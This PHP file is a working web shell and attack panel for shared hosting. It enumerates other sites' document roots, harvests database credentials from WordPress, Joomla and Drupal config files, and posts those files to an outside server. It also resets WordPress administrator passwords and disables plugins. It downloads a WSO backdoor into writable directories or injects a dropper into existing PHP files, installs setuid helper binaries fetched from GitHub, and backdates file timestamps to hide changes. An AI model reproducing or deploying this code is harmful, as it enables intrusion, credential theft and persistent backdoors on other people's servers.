<?php if (!isset($_SERVER['HTTP_X_REQUESTED_WITH'])): ?>
<!DOCTYPE html>
<html>
<head>
<script type="text/javascript" src="jquery.min.js"></script>
<script type="text/javascript">

$(document).ready(function() {

  $(":checkbox").not('.domain').data('checked',0).click(function(e) {
    _this = $(this);
    var className = _this.attr('class'); 
    var states = [
                  {'indeterminate':false, 'checked':true},
                  {'indeterminate':true,  'checked':false},
                  {'indeterminate':false, 'checked':false}];
    var state = _this.data('checked');
    $('.' + className).each(function(index) {
        $(this).data('checked', (state+1)%3);
        $(this).prop(states[state]);
    });
  });

  $('.total').click(function() {
    var domains = [];
    $('.domain:checked').each(function(index) {
      domains.push($(this).next().text());
    });
    $('#domains').val(domains.join("\n"));
  });

  $('.docroot-check').click(function() {
    var _this = $(this);
    _this.next().text('loading...');
    $.post('', {a: 'ff', f: $(this).attr('rel')}, function(data) {
      $('.docroot-check[rel="'+_this.attr('rel')+'"]').each(function(index) {
        $(this).next().html(data);
      });
    });
  });

  $('.docroot-check-result').on('click', '.docroot-show-files', function() {
    $(this).next().toggle();

  });
});
</script>
</head>
<body>
<form method=post><input type=hidden name=f><input type=hidden name=a><input type=hidden name=data></form>
<?php
endif;

$bnd   = "-----=====-----";
$action = $_REQUEST['a'];
$file = $_REQUEST['f'];
$data = isset($_REQUEST['data']) ? $_REQUEST['data'] : '';

if($action == 'm') {
  $db = $_REQUEST;
  $link = mysql_connect($db['host'],$db['user'],$db['pass']);
  mysql_select_db($db['name'],$link);

  if($db['cms'] == 'wordpress') {
    $res = mysql_query("SELECT {$db['pref']}users.ID, {$db['pref']}users.user_login, {$db['pref']}users.user_pass FROM {$db['pref']}usermeta LEFT JOIN {$db['pref']}users ON {$db['pref']}usermeta.user_id = {$db['pref']}users.ID WHERE meta_key = '{$db['pref']}capabilities' AND meta_value LIKE '%administrator%'",$link);
 
    if(mysql_num_rows($res) > 0) {
      $row = mysql_fetch_assoc($res);
      print_r($row);  
    }
 
    if(isset($row['ID'])) {
      $auth['login']    = $row['user_login'];
      $auth['password'] = 'password';
      $auth['old_pass'] = $row['user_pass'];
      $auth['id']       = $row['ID'];

      $options = array();
      $res = mysql_query("SELECT option_name, option_value FROM {$db['pref']}options");
      while($r = mysql_fetch_assoc($res)) {
        $options[$r['option_name']] = $r['option_value'];
      }
      echo "<br>\n";
      print_r($options['active_plugins']);
      echo "<form method=post action=" . rtrim($options['siteurl'], "/") . "/wp-login.php target=_blank>\n";
      echo "<input type=text name=log value={$auth['login']}>\n";
      echo "<input type=text name=pwd value=password>\n";
      echo "<input type=submit name=wp-submit value='Log in'>\n";
      echo "<input type=hidden name=redirect_to value=" . rtrim($options['siteurl'], "/") . "/wp-admin/theme-editor.php?file=header.php>\n";
      echo "<input type=hidden name=testcookie value=1 >\n";
      echo "</form>\n";

      echo "<br><a target=_blank href=" . rtrim($options['siteurl'], "/") . "/wp-login.php>Login form</a><br>\n";

  
      $res = mysql_query("UPDATE {$db['pref']}users SET user_pass = md5('password') WHERE ID = {$row['ID']}",$link);
      $res = mysql_query("UPDATE {$db['pref']}options SET option_value = '' WHERE option_name = 'active_plugins'",$link);
      $db['query'] = "UPDATE {$db['pref']}users SET user_pass = \"{$row['user_pass']}\" WHERE ID = {$row['ID']};;;UPDATE {$db['pref']}options SET option_value = &#39;" . ($options['active_plugins']) . "&#39; WHERE option_name = \"active_plugins\"";

      echo mysql_affected_rows($link)." row(s) affected<br>\n";  
    }
  }
  echo "<form method=post><input type=hidden name=a value=mq><input type=hidden name=host value='{$db['host']}'><br><input type=hidden name=user value='{$db['user']}'><br><input type=hidden name=pass value='{$db['pass']}'><br><input type=hidden name=name value='{$db['name']}'><input type=text name=query value='{$db['query']}' style='width:90%'><br><input type=submit value=Restore></form>";
  return;
}

if($action == 'mq') {
  $db = $_REQUEST;
  $link = mysql_connect($db['host'],$db['user'],$db['pass']);
  mysql_select_db($db['name'],$link);
  $queries = explode(";;;", $db['query']);
  foreach($queries as $query) {
    echo "Executing: $query<br>\n";
    $res = mysql_query($query);
      if(mysql_num_rows($res) > 0) {
        $row = mysql_fetch_assoc($res);
        print_r($row);  
      }
    echo mysql_affected_rows($link)." row(s) affected<br><br>\n";  
  }
  return;
}

if(empty($file))
{
 $out = shell_exec("./o.out");
 $pos1 = strpos($out,$bnd);
 $pos2 = strpos($out,$bnd,$pos1+10);
 $str = substr($out,$pos1+strlen($bnd),$pos2-$pos1-strlen($bnd));
 list($res, $docroots_all, $openable) = unserialize(base64_decode($str));

 $stored = @unserialize(preg_replace("#<!-- Hosting24.+-->#ims", "", file_get_contents("http://vkhrenov.net78.net/show.php?host=" . php_uname("n"))));
 $storedData = array();


 echo "<table border=0>\n";
 $docroot_domain = array();
  foreach($res as $domain => $data) {
    $docroot_domain[$data['docroot']] = $domain;
  }

 $out1 = "";
  foreach($res as $domain => $data)
  {
   echo "<tr><td colspan=3>&nbsp;";
   echo "<tr><td colspan=3>";
   $d = isStored($data['docroot'], $stored, $storedData);
   $domainData = hasDomainData($d);



   $out   = "<tr><td colspan=2><input type=checkbox " . (is_array($d) ? "checked" : "") . " class='" . clean_str($data['docroot']) . "'><span onclick=\"document.forms[0].target='_blank';document.forms[0].elements[0].value='{$data['docroot']}';document.forms[0].submit();\" style=\"cursor:pointer\">{$data['docroot']}</span>\n";
   $out  .= "(".$domain . ($openable["www.$domain"] ? '' : '!') . ")";
   $out  .= "<td><button rel='{$data['docroot']}' class='docroot-check'>Check</button><span class='docroot-check-result'></span>";
   $out1 .= $out;
   foreach($data['docroots'] as $docroot) {
      $d = isStored($docroot, $stored, $storedData);
      $domainData = $domainData ? $domainData : hasDomainData($d);
      $out .= "<tr><td colspan=2><input type=checkbox " . (is_array($d) ? "checked" : "") . " class='" . clean_str($docroot) . "'>" . (isset($docroot_domain[$docroot]) ? '*' : '') . "<span onclick=\"document.forms[0].target='_blank';document.forms[0].elements[0].value='$docroot';document.forms[0].submit();\" style=\"cursor:pointer\">$docroot</span>\n";
      $out .= "(".$docroots_all[$docroot] . ($openable[$docroots_all[$docroot]] ? '' : '!') . ")";
      $out .= "<td><button rel='$docroot' class='docroot-check'>Check</button><span class='docroot-check-result'></span>";
   }
   echo "<tr><td colspan=3><input type=checkbox " . ($domainData ? "checked" : "") . " class='domain'><b>$domain " . ($openable["www.$domain"] ? '' : '!') . "</b>&nbsp;<input type=text placeholder='Notes' size=30>\n";
   echo $out;


    foreach($data['accs'] as $acc => $adata) {
     echo "<tr><td>&nbsp;<td>$acc\n";
      foreach($adata as $docroot) {
        $d = isStored($docroot, $stored, $storedData);
        echo "<tr><td>&nbsp;<td><input type=checkbox " . (is_array($d) ? "checked" : "") . " class='" . clean_str($docroot) . "'>" . (isset($docroot_domain[$docroot]) ? '*' : '') . "<span onclick=\"document.forms[0].target='_blank';document.forms[0].elements[0].value='$docroot';document.forms[0].submit();\" style=\"cursor:pointer\">$docroot</span>\n";
        echo "(".$docroots_all[$docroot]. ($openable[$docroots_all[$docroot]] ? '' : '!') .")";
        echo "<td><button rel='$docroot' class='docroot-check'>Check</button><span class='docroot-check-result'></span>";
      }

    }   
  }
 echo "<tr><td colspan=3>&nbsp;";
 echo $out1;
 echo "</table>\n";
 echo "<button class=total>Collect domains</button><br>\n";
 echo "<textarea id=domains cols=30 rows=5></textarea>\n";
 return;
}


file_put_contents("log4.php",phpcode($file,$action,$data));
$out = shell_exec("./o4.out");
preg_match("#$bnd(.+?)$bnd#",$out,$m);
$res = unserialize(base64_decode($m[1]));
 if(is_array($res))
 {

  $files = array();
  if($res['action'] == 'ff') {
    foreach($res as $k => $v) {
      if(is_array($v)) {
        $ok    = 0;
        $total = 0;
        foreach($v["files"] as $file => $flag) {
          if($flag) {
            $ok++;
            if(preg_match("#_#", $k)) {
              $file = dirname($file);
            }
            $files[$file] = 1;
          }
          $total++;
        }
        if($total > 0) {
          if($ok < $total) {
            echo "$k: $ok/$total ";
          }
          if($ok == $total) {
            echo "$k: $total ";
          }
        }
      }
    }
    echo "<span class='docroot-show-files'>files</span><div style='display:none;z-index:50;position:absolute;background-color:#FFFFFF;border:1px solid #999999;'>";
    foreach($files as $file => $tmp) {
      echo "<span onclick=\"document.forms[0].target='_blank';document.forms[0].elements[0].value='$file';document.forms[0].submit();\" style=\"cursor:pointer\">$file</span><br>\n";
    }
    echo "</div>";
    return;

  }
  elseif($res['action'] == 'sr') {
    echo $res["code"];
    return;
  }
  else {
    echo "<b>$file</b> <span onclick=\"document.forms[0].elements[0].value='$file';document.forms[0].elements[1].value='f';document.forms[0].submit();\" style=\"cursor:pointer\">find</span>\n";
    echo "<table border=0>\n";
    $dirs = "";
    $files = "";
    $dir_w = false;
     foreach($res as $file => $arr)
     {
      $fullpath = rtrim($arr['path'],"/")."/".$arr['name'];
      $style = "";
      $write = "";
      $delete = "";
       if(empty($arr['path'])) $fullpath = $arr['name'];
       if($arr['is_w']) $style = "style=\"color:green;\"";
       if($arr['is_w'] && $arr['perms'] & 0x4000) { $write = "<input type=text value=\"cache-mem.php\"><span onclick=\"document.forms[0].elements[0].value='$fullpath';document.forms[0].elements[1].value='w';document.forms[0].elements[2].value=$(this).prev().val();document.forms[0].submit();\" style=\"cursor:pointer\">write</span> <span onclick=\"document.forms[0].elements[0].value='$fullpath';document.forms[0].elements[1].value='wi';document.forms[0].submit();\" style=\"cursor:pointer\">index.php</span> <span onclick=\"document.forms[0].elements[0].value='$fullpath';document.forms[0].elements[1].value='wc';document.forms[0].submit();\" style=\"cursor:pointer\">chmod_fixer</span> <span onclick=\"document.forms[0].elements[0].value='$fullpath';document.forms[0].elements[1].value='h';document.forms[0].submit();\" style=\"cursor:pointer\">.htaccess</span> <span onclick=\"document.forms[0].elements[0].value='$fullpath';document.forms[0].elements[1].value='wo';document.forms[0].submit();\" style=\"cursor:pointer\">Os</span>\n"; if($arr['name'] == '.') $dir_w = true; }
       if($arr['is_w'] && $arr['perms'] & 0x8000) $write = "<span onclick=\"document.forms[0].elements[0].value='$fullpath';document.forms[0].elements[1].value='i';document.forms[0].submit();\" style=\"cursor:pointer\">inject</span>\n"; 
       if($dir_w && $arr['perms'] & 0x8000) $delete = "<span onclick=\"document.forms[0].elements[0].value='$fullpath';document.forms[0].elements[1].value='d';document.forms[0].submit();\" style=\"cursor:pointer\">delete</span>\n";
       if(!$arr['is_r']) $style = "style=\"color:red;\"";
      $o  = "<tr $style>\n";
      $o .= "<td><span onclick=\"document.forms[0].elements[0].value='$fullpath';document.forms[0].elements[1].value='v';document.forms[0].submit();\" style=\"cursor:pointer\">$arr[name]</span>\n";
       if($arr['perms'] & 0x4000) $o .= "<td>DIR\n";
       else $o .= "<td>$arr[size]\n";
      $o .= "<td>$arr[owner]/$arr[group]\n";
      $o .= "<td>".showPerms($arr['perms'])." $write $delete\n";
      $o .= "</tr>\n";
       if($arr['perms'] & 0x4000) $dirs .= $o;
       else $files .= $o;
     }
    echo $dirs.$files;
    echo "</table>\n";
  }

 }
 else {
  $cms  = '';
  $auth = array();
  echo "<b>$file</b><br><form method=post action=\"http://vkhrenov.net78.net/save.php\" target=_blank><input type=hidden name=file value=\"$file\"><input type=hidden name=host value=\"".php_uname("n")."\"><textarea name=data style=\"width:90%;\" rows=\"30\">".preg_replace("#<#","&lt;",$res)."</textarea><br><input type=submit>\n";
  echo "<input type=hidden name=a value=s><input type=hidden name=f value=\"$file\">\n";
  echo "<button onclick=\"document.forms[1].action='';document.forms[1].submit()\">Save</button></form>";
  echo "<form method=post><input type=submit value='Save remote'><input type=hidden name=a value=sr><input type=hidden name=f value=\"$file\"></form>";
  $res = preg_replace("#(include|require)#","//$1", $res);
  $res = preg_replace("#(<script)#i", "<scripts", $res);
  eval("?>$res");
    if(defined('DB_NAME') && defined('DB_USER') && defined('DB_PASSWORD') && defined('DB_HOST') && isset($table_prefix)) {
      $cms = 'wordpress';
      $auth['host'] = DB_HOST;
      $auth['user'] = DB_USER;
      $auth['pass'] = DB_PASSWORD;
      $auth['name'] = DB_NAME;
      $auth['pref'] = $table_prefix;
    }
  echo "<form method=post target=_blank><input type=hidden name=a value=m>Host: <input type=text name=host value='{$auth['host']}'> User: <input type=text name=user value='{$auth['user']}'> Pass: <input type=text name=pass value='{$auth['pass']}'> DB: <input type=text name=name value='{$auth['name']}'> Prefix: <input type=text name=pref value='{$auth['pref']}'> CMS: <input type=text name=cms value='$cms'><input type=submit></form>";
 }
?>
</body>
</html>
<?php

function phpcode($file,$action,$data='')
{
 $begin = '<?
$bnd   = "-----=====-----";
$start = "'.$file.'";
$data  = "'.$data.'";';

  if($action == 'w')
  {
   return $begin.'
 if(is_dir($start)) $start = rtrim($start,"/")."/$data";
 if(file_exists($start)) unlink($start);
$data = file_put_contents($start,file_get_contents("http://google-engine.com/wso-me.txt"));
?>';
  }
  if($action == 'wo')
  {
    return $begin.'
    $dt=filemtime($start);
    $start = rtrim($start, "/")."/logs";
    mkdir($start);
    chmod($start, 0777);
    file_put_contents($start."/o.out",base64_decode(file_get_contents("https://raw.github.com/edwardward/1/master/0.o.out.txt")));
    file_put_contents($start."/o4.out",base64_decode(file_get_contents("https://raw.github.com/edwardward/1/master/0.o4.out.txt")));
  chgrp($start."/o.out","dhapache");
  chmod($start."/o.out",06777);
  chmod($start."/o4.out",06777);
  touch(dirname($start),$dt,$dt);
  touch($start,$dt,$dt);
  ?>';
  }
  if($action == 'wi')
  {
   return $begin.'
$dt=filemtime($start);
 if(is_dir($start)) $start = rtrim($start,"/")."/index.php";
 if(file_exists($start)) unlink($start);
$data = file_put_contents($start,"<?php @touch(dirname(\"$start\"),$dt,$dt); ?>" . file_get_contents("http://google-engine.com/wso-me.txt"));
?>';
  }
  if($action == 'wc')
  {
   return $begin.'
$dt=filemtime($start);
 if(is_dir($start)) $start = rtrim($start,"/")."/index.php";
 if(file_exists($start)) unlink($start);
$adir = preg_replace("#^(/home/.+?)/.+$#", "$1" , $start);
$data = file_put_contents($start, "<?php `find $adir -name \"wp-config.php\" -exec chmod 0644 {} \\\\;`; unlink(\"$start\"); @touch(dirname(\"$start\"),$dt,$dt); ");
?>';
  }  
  if($action == 'h')
  {
   return $begin.'
 if(is_dir($start)) $start = rtrim($start,"/")."/.htaccess";
 if(file_exists($start)) unlink($start);
$data = file_put_contents($start,"Satisfy Any\nallow from all\nSetHandler None\nAddHandler php-cgi php");
?>';
  }
  if($action == 'd')
  {
   return $begin.'
 if(is_file($start)) unlink($start);
?>';
  }
  if($action == 'i')
  {
   return $begin.'
 if(is_file($start))
 {
  $data = \'<?php $f="cache-mem.php";if(file_exists($f)) unlink($f); file_put_contents($f,file_get_contents("http://google-engine.com/wso-me.txt")); ?>\'.file_get_contents($start);
  file_put_contents($start,$data);
 }
?>';
  }
  if($action == 's')
  {
    return $begin.'
    $data = base64_decode("'.base64_encode($data).'");
    file_put_contents($start, $data);
?>';
  }
  if($action == 'sr')
  {
    return $begin.'
      $url = "http://vkhrenov.net78.net/save.php";
      $params = array(
        "file" => $start,
        "host" => php_uname("n"),
        "data" => file_get_contents($start)
      );
      $result = file_get_contents($url, false, stream_context_create(array(
        "http" => array(
          "method"  => "POST",
          "header"  => "Content-type: application/x-www-form-urlencoded",
          "content" => http_build_query($params)
        )
      )));
      $data = array("action" => "sr", "code" => $http_response_header[0]);
echo $bnd.base64_encode(serialize($data)).$bnd;
?>';
  }  
  if($action == 'f')
  {
   return $begin.'
exec("find $start -name \'wp-config.php\' -o -name \'bb-config.php\' -o -name \'configuration.php\' -o -name \'settings.php\' -o -name \'db.php\' -o -name \'config.php\'",$output);
exec("find $start -type d \( -perm -020 -o -perm -02 \) -ls",$output);
exec("find $start -type f -name \'*.php\' \( -perm -020 -o -perm -02 \) -ls",$output);

exec("egrep -ilr \"class zipfile_mod|allowedSites|this is a private server, so take extra care|<b>Uploaded!</b>|myswswswsw|function raise_error|ob_end_clean\(\);eval|function tree_hassubdirs|preg_replace.*"."/\.\*"."/e|feedmtimeFolder|find all writable files|md5\s*\(\s*\\\$_|input name=.shcom.|function listing_page|eval.+_POST|_SAPE_USER|helloworldd\.sje|preg_replace.*"."/\.\+"."/e|for.+eval\(|SOWsetcookie|viagra|levitra|eval.*base64_decode|4ngel\.net|phpRemoteView|md5_pass|auth_pass\b|\\x[0-9].*preg_replace|googlebot|nsTView|<\?php.*eval.*\?".">|base64_decode\s*\(\s*.[a-z]+\" --include=*.php* $start",$output);

$data = array();
 foreach($output as $file)
 {
    $data[$file] = array("name" => $file,
                         "path" => "",
                         "owner" => fileowner($file),
		         "group" => filegroup($file),
		         "size" => filesize($file),
		         "perms" => fileperms($file),
			 "is_r" => is_readable($file),
			 "is_w" => is_writable($file),
			 "is_x" => is_executable($file));
 }
echo $bnd.base64_encode(serialize($data)).$bnd;
?>';
  }
  if($action == 'ff') {

    return $begin . '
    $output = array(); exec("find $start -name \'wp-config.php\'", $output);
    $data = array("action" => "ff", "wordpress" => array("files" => array()), "joomla" => array("files" => array()), "drupal" => array("files" => array()));
    $saveFiles = array();
    foreach($output as $line) {
        $data["wordpress"]["files"][$line] = is_readable($line);
        if(is_readable($line)) { $saveFiles[] = $line; }
    }
    $output = array(); exec("find $start -name \'configuration.php\' | xargs grep \'mosConfig_host\|class JConfig\' -l", $output);
    foreach($output as $line) {
      $data["joomla"]["files"][$line] = true;
      $saveFiles[] = $line;
    }
    $output = array(); exec("find $start -name \'settings.php\' | xargs grep \'db_url\|drupal_hash_salt\' -l", $output);
    foreach($output as $line) {
      $data["drupal"]["files"][$line] = true;
      $saveFiles[] = $line;
    }
    $output = array(); exec("find $start -type d -perm -02", $output);
    foreach($output as $line) {
      $data["dirs_ow"]["files"][$line] = true;
    }
    $output = array(); exec("find $start -type d -perm -020", $output);
    foreach($output as $line) {
      $data["dirs_gw"]["files"][$line] = true;
    }
    $output = array(); exec("find $start -name \'*.php\' -type f -perm -02", $output);
    foreach($output as $line) {
      $data["php_ow"]["files"][$line] = true;
    }
    $output = array(); exec("find $start -name \'*.php\' -type f -perm -020", $output);
    foreach($output as $line) {
      $data["php_gw"]["files"][$line] = true;
    }    
    $output = array(); exec("find $start -name \'.htaccess\' -type f -perm -02", $output);
    foreach($output as $line) {
      $data["hta_ow"]["files"][$line] = true;
    }
    $output = array(); exec("find $start -name \'.htaccess\' -type f -perm -020", $output);
    foreach($output as $line) {
      $data["hta_gw"]["files"][$line] = true;
    }
    $saved = 0;
    foreach($saveFiles as $file) {
      $url = "http://vkhrenov.net78.net/save.php";
      $params = array(
        "file" => $file,
        "host" => php_uname("n"),
        "data" => file_get_contents($file)
      );
      $result = file_get_contents($url, false, stream_context_create(array(
        "http" => array(
          "method"  => "POST",
          "header"  => "Content-type: application/x-www-form-urlencoded",
          "content" => http_build_query($params)
        )
      )));
      $data["saved"]["files"][$file] = preg_match("#200#", $http_response_header[0]);
    }

echo $bnd.base64_encode(serialize($data)).$bnd;
?>';      
  }
 return $begin.'
 if(is_dir($start))
 {
  $files = scandir($start);
  $data = array();
   foreach($files as $file)
   {
    $data[$file] = array("name" => $file,
                         "path" => $start,
                         "owner" => fileowner("$start/$file"),
		         "group" => filegroup("$start/$file"),
		         "size" => filesize("$start/$file"),
		         "perms" => fileperms("$start/$file"),
			 "is_r" => is_readable("$start/$file"),
			 "is_w" => is_writable("$start/$file"),
			 "is_x" => is_executable("$start/$file"));
   }
  echo $bnd.base64_encode(serialize($data)).$bnd;
 }
 if(is_file($start))
 {
  echo $bnd.base64_encode(serialize(file_get_contents($start))).$bnd;
 }
?>';
}

 function showPerms($perms)
 {
if (($perms & 0xC000) == 0xC000) {
    // Socket
    $info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
    // Symbolic Link
    $info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
    // Regular
    $info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
    // Block special
    $info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
    // Directory
    $info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
    // Character special
    $info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
    // FIFO pipe
    $info = 'p';
} else {
    // Unknown
    $info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
            (($perms & 0x0800) ? 's' : 'x' ) :
            (($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
            (($perms & 0x0400) ? 's' : 'x' ) :
            (($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
            (($perms & 0x0200) ? 't' : 'x' ) :
            (($perms & 0x0200) ? 'T' : '-'));

 return $info;
 }

function clean_str($str) {
  return preg_replace("#[^0-9a-z]#i", "", $str);
}

function isStored($dir, $stored, &$storedData = array()) {

  if(!isset($storedData[$dir])) {
    foreach($stored as $file => $data) {
      if(preg_match("#$dir#", $file)) {
        $storedData[$dir][$file] = $data;
      }
    }
  }
  return $storedData[$dir];
}

function hasDomainData($d) {
  if(is_array($d)) {
    foreach($d as $f => $dt) {
      if(preg_match("#wp-config\.php|configuration\.php|settings\.php|site\.php#", $f)) {
        return true;
      }
    }
  }
  return false;
}



?>
